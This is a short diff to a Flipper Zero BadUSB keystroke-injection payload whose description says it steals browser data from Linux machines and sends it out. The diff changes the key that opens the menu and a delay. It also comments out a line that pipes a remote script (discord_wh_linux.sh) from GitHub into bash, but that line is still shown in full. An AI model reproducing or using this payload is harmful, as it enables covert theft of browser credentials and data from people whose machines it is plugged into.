@@ -6,12 +6,12 @@ REM     Description: This payload is meant to steal Browser Data and send ii usi
 
 REM     Target: Maximum Linux distributions
 
-GUI
+ALT F1
 DELAY 500
 STRING terminal
-DELAY 200
+DELAY 500
 DOWN
 ENTER
 DELAY 500
-STRING curl -sSL https://raw.githubusercontent.com/MagikarpLv13/flipper-zero/main/badusb/BrowserData/discord_wh_linux.sh | bash
+REM STRING curl -sSL https://raw.githubusercontent.com/MagikarpLv13/flipper-zero/main/badusb/BrowserData/discord_wh_linux.sh | bash
 ENTER
